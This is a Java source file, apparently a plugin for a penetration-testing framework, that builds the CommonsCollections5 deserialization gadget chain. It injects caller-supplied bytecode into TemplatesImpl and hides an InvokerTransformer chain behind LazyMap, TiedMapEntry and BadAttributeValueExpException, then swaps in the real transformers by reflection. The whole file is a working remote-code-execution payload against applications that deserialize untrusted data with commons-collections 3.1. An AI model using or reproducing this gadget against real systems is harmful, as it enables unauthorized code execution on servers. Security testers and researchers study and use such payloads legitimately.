package me.gv7.woodpecker.plugin.gadgets.bytecode;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

import static me.gv7.woodpecker.plugin.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-3.1")
@RequireParameter("ResourcePath")
public class CC5 implements ObjectPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{input.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer", null, null)
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap=new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);
        TiedMapEntry tme=new TiedMapEntry(outerMap,"keykey");
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);


        setFieldValue(expException,"val",tme);
        //反射修改chainedTransformer中的iTransformers为transforms
        setFieldValue(transformerChain,"iTransformers",transformers);
        return expException;
    }
}
